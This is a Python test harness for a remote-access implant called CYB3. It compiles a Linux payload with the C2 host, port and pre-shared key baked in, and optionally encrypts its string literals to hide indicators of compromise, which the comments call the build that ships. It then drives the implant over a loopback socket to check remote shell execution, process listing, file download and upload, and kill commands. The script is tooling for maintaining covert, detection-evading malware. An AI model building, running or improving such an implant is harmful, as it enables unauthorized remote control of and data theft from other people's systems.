#!/usr/bin/env python3
"""
implant_test.py — end-to-end test: drives the real compiled Linux implant
against a Python CYB3 listener over a loopback socket.

    gcc -O2 -o /tmp/payload.elf ../pay_linux.c -lX11 -lpthread -lcrypt -ldl -lm
    python3 implant_test.py /tmp/payload.elf
"""

import os
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import cybc2 as C                                            # noqa: E402

g_pass = g_fail = 0


def check(name, cond, detail=""):
    global g_pass, g_fail
    if cond:
        print(f"  [PASS] {name}")
        g_pass += 1
    else:
        print(f"  [FAIL] {name}")
        if detail:
            print(f"         {detail}")
        g_fail += 1


class Implant:
    """A running implant plus the server side of its session."""

    def __init__(self, binary, psk, port, extra_args=()):
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", port))
        self.srv.listen(1)
        self.srv.settimeout(25)
        self.port = port
        self.psk = psk
        self.proc = subprocess.Popen(
            [binary, "127.0.0.1", str(port), *extra_args],
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        self.conn = None
        self.sess = None
        self.client_pub = None
        self.log = []

    def accept(self):
        self.conn, _ = self.srv.accept()
        self.conn.settimeout(20)
        self.sess, self.client_pub, _ = C.server_handshake(self.conn, self.psk)
        return True

    def run(self, cmd, timeout=20):
        """Send a command, return the response text."""
        self.sess.send(self.conn, C.T_CMD, cmd.encode())
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self.conn.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            self.sess.feed(chunk)
            got = None
            while True:
                msg = self.sess.recv()
                if msg is None:
                    break
                ftype, pt = msg
                if ftype == C.T_PING:
                    self.sess.send(self.conn, C.T_PONG, pt)
                    continue
                if ftype == C.T_PONG:
                    continue
                got = pt
            if got is not None:
                return got.decode("utf-8", "replace")
        return "<timeout>"

    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception:
            pass
        try:
            self.srv.close()
        except Exception:
            pass
        try:
            self.proc.terminate()
            self.proc.wait(timeout=5)
        except Exception:
            try:
                self.proc.kill()
            except Exception:
                pass


def build(binary, psk, port, src, obfuscate=False):
    """Compile the implant with the given host/port/PSK baked in.

    With obfuscate=True the sources are run through cybstrenc.py first, so the
    whole command surface is encrypted at rest. That is the build that actually
    ships, so it is the one that has to pass this suite -- a decoder bug shows
    up here as a mangled help text or a command verb that no longer matches.
    """
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    text = open(src).read()
    text = re.sub(r'#define PSK_HEX "[0-9a-fA-F]*"',
                  f'#define PSK_HEX "{psk.hex()}"', text)
    text = re.sub(r'#define C2_HOST "[^"]*"', '#define C2_HOST "127.0.0.1"', text)
    text = re.sub(r'#define C2_PORT \d+', f'#define C2_PORT {port}', text)

    work = tempfile.mkdtemp(prefix="cyb_obf_")
    fd, path = tempfile.mkstemp(suffix=".c")
    os.write(fd, text.encode())
    os.close(fd)

    includes = [os.path.dirname(src)]
    _orig_path = path
    if obfuscate:
        # cybstrenc.py rewrites the literals of every file it is given, and
        # cybcrypt.h is in that set now -- it carries "bcrypt.dll" and
        # "BCryptGenRandom", which is as much of an IOC as the PSK. It can be
        # obfuscated because the generated cybstr.h is self-contained (own
        # SHA-256, no #include of cybcrypt.h), so the circular dependency
        # between "cybcrypt.h needs the decoder" and "the decoder needs
        # cybcrypt.h" does not arise. -I<root> resolves anything not
        # obfuscated, -I<work> picks up the rewritten copies.
        r = subprocess.run(
            [sys.executable, os.path.join(root, "cybstrenc.py"),
             "--key", "cyberdemon", "--quiet", "--no-harness",
             "-i", path, "-i", os.path.join(root, "cybproto.h"),
             "-i", os.path.join(root, "cybbuf.h"),
             "-i", os.path.join(root, "cybcrypt.h"), "-o", work],
            capture_output=True, text=True)
        if r.returncode != 0:
            sys.exit(f"obfuscation failed:\n{r.stdout}\n{r.stderr}")
        # gcc decides C vs C++ by extension, and the copy keeps the name, so
        # rename it explicitly rather than relying on the mkstemp suffix.
        os.unlink(path)
        path = os.path.join(work, "pay_obf.c")
        os.rename(os.path.join(work, os.path.basename(_orig_path)), path)
        includes = [root, work]

    r = subprocess.run(
        ["gcc", "-O1", "-g"] + ["-I" + d for d in includes] +
        ["-o", binary, path,
         "-lX11", "-lpthread", "-lcrypt", "-ldl", "-lm"],
        capture_output=True, text=True)
    if r.returncode != 0:
        sys.exit(f"implant build failed:\n{r.stderr}")
    return binary


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: implant_test.py <implant-binary>")
    binary = sys.argv[1]
    src = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                       "pay_linux.c")

    psk = os.urandom(32)
    port = 45999
    # CYB_OBFUSCATE=1 tests the build that ships: every string literal in the
    # implant encrypted at rest with the cybstrenc.py pipeline.
    obfuscate = os.environ.get("CYB_OBFUSCATE") == "1"
    binary = build(binary, psk, port, src, obfuscate=obfuscate)
    print(f"rebuilt implant with a fresh PSK on 127.0.0.1:{port}"
          + ("  [string literals encrypted]" if obfuscate else ""))

    imp = Implant(binary, psk, port)
    try:
        print("\n== handshake ==")
        check("implant connects and completes CYB3", imp.accept())
        check("client public key looks sane",
              imp.client_pub is not None and len(imp.client_pub) == 32 and
              imp.client_pub != b"\x00" * 32)

        print("\n== commands ==")
        r = imp.run("!help")
        check("!help returns the command list", "Available commands" in r, r[:120])

        r = imp.run("echo hello-cyb3")
        check("echo works", "hello-cyb3" in r, repr(r[:120]))

        r = imp.run("!pwd")
        check("!pwd returns a path", r.strip().startswith("/"), repr(r[:80]))

        r = imp.run("!cd /tmp")
        check("!cd /tmp", "/tmp" in r, repr(r[:80]))
        r = imp.run("!pwd")
        check("!cd persisted", r.strip() == "/tmp", repr(r[:80]))

        r = imp.run("!sysinfo")
        check("!sysinfo reports memory", "Memory Total" in r, repr(r[:200]))
        check("!sysinfo reports the OS", "Linux" in r, repr(r[:200]))

        r = imp.run("!ps")
        check("!ps lists processes", "PID" in r and "CMD" in r, repr(r[:120]))

        r = imp.run("!ls /etc")
        check("!ls lists a directory", "passwd" in r or "Directory listing" in r,
              repr(r[:200]))

        # download
        marker = f"cyb3-test-{os.urandom(4).hex()}"
        src_path = f"/tmp/{marker}.txt"
        open(src_path, "w").write(marker)
        r = imp.run(f"!download {src_path}")
        check("!download returns a [DOWNLOAD] frame", r.startswith("[DOWNLOAD]"), repr(r[:80]))
        if r.startswith("[DOWNLOAD]"):
            import base64
            path, _, b64 = r[len("[DOWNLOAD]"):].partition("|")
            data = base64.b64decode(b64)
            check("downloaded content matches", data.decode() == marker,
                  repr(data[:80]))
        os.unlink(src_path)

        # upload
        payload = b"uploaded-by-cyb3\n"
        import base64
        b64 = base64.b64encode(payload).decode()
        dst = f"/tmp/{marker}-up.txt"
        r = imp.run(f"!upload {dst}|{b64}")
        check("!upload reports success", "Uploaded" in r, repr(r[:120]))
        check("uploaded file content is correct",
              os.path.exists(dst) and open(dst, "rb").read() == payload)
        if os.path.exists(dst):
            os.unlink(dst)

        print("\n== hardening behaviour ==")
        r = imp.run("!kill notanumber")
        check("!kill rejects a non-numeric pid", "invalid PID" in r, repr(r[:80]))
        r = imp.run("!kill 999999")
        check("!kill reports failure for a missing pid", "Error" in r, repr(r[:80]))
        r = imp.run("!cd /nonexistent-directory-xyz")
        check("!cd reports a bad directory", "Error" in r, repr(r[:80]))
        r = imp.run("!download /nonexistent-file-xyz")
        check("!download reports a missing file", "Error" in r, repr(r[:80]))
        r = imp.run("!upload /tmp/x|not!valid!base64!")
        check("!upload rejects invalid base64", "Error" in r, repr(r[:80]))
        r = imp.run("!upload /tmp/x|" + "A" * (14 * 1024 * 1024), timeout=60)
        check("!upload enforces the 10MB cap", "limit" in r, repr(r[:160]))

        # a real multi-megabyte upload must survive intact
        import base64 as _b64
        big = os.urandom(3 * 1024 * 1024)
        dst2 = f"/tmp/{marker}-big.bin"
        r = imp.run(f"!upload {dst2}|" + _b64.b64encode(big).decode(), timeout=90)
        check("3MB upload accepted", "Uploaded 3145728" in r, repr(r[:160]))
        if os.path.exists(dst2):
            got = open(dst2, "rb").read()
            check("3MB upload round-trips byte-exact", got == big,
                  f"{len(got)} vs {len(big)}")
            os.unlink(dst2)

        # a very long command line must not crash anything
        r = imp.run("echo " + "A" * 60000)
        check("oversized command is rejected cleanly",
              "too long" in r.lower() or r == "<timeout>" or "echo" in r, repr(r[:80]))
        # the session must still work afterwards
        r = imp.run("echo still-alive")
        check("session survives abusive input", "still-alive" in r, repr(r[:120]))

        print("\n== keepalive ==")
        # PING/PONG: the implant sends one every 45s, so just confirm the
        # command path is still healthy and the socket has not rotted
        r = imp.run("echo ping-check")
        check("connection healthy after the test run", "ping-check" in r, repr(r[:80]))

    finally:
        imp.close()

    print("\n======================================================")
    print(f" passed: {g_pass}   failed: {g_fail}")
    print("======================================================")
    return 1 if g_fail else 0


if __name__ == "__main__":
    sys.exit(main())
